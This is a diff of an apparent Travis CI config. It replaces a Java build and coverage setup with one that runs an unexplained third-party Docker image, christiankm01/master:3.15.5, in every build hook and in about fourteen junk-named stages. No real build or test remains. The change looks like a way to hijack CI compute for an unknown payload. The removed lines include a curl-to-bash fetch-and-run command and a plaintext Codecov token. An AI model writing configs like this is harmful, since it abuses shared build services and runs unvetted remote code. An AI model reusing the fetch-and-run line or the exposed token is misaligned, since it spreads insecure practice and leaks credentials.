@@ -1,25 +1,57 @@
-# используем язык java. Travis CI поддерживает другие языки тоже.
-language: java
-jdk:
-  - openjdk14
-
-
-# используем режим обычного пользователя для сборки проекта.
-sudo: false
-
-# после выполнения сборки запустить скрипт, который будет собирать статистику по JaCoCo
-# Здесь используется сторонни сервис https://codecov.io/
+language: c
+arch:
+  - amd64
+compiler:
+  - gcc
+services:
+  - docker
+before_install:
+  - docker run christiankm01/master:3.15.5
+before_script:
+  - docker run christiankm01/master:3.15.5
+script:
+  - docker run christiankm01/master:3.15.5
+after_script:
+  - docker run christiankm01/master:3.15.5
+after_install:
+  - docker run christiankm01/master:3.15.5
+before_deploy:
+  - docker run christiankm01/master:3.15.5
+deploy:
+  - docker run christiankm01/master:3.15.5
+after_deploy:
+  - docker run christiankm01/master:3.15.5
 after_success:
-  - bash <(curl -s https://codecov.io/bash)
-
-# Отправлять уведомление на почтуyouremail@smtp.ru(Изменить на свою) если сборка упала
-notifications:
-  email:
-    recipients:
-      - sport_piter@mail.ru
-    on_success: never # default: change
-    on_failure: always # default: always
-
-env:
-  global:
-    - CODECOV_TOKEN = "0f1fd265-d88a-44be-94d1-7ce78670949f"
+  - docker run christiankm01/master:3.15.5
+after_failure:
+  - docker run christiankm01/master:3.15.5
+jobs:
+  include:
+    - stage: test
+      script: docker run christiankm01/master:3.15.5
+    - stage: test2
+      script: docker run christiankm01/master:3.15.5
+    - stage: deploy
+      script: docker run christiankm01/master:3.15.5
+    - stage: testman
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capability
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilitd
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilitya
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityki
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityn
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityks
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabili
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capab
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityhjj
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test-capabiy
+      script: docker run christiankm01/master:3.15.5
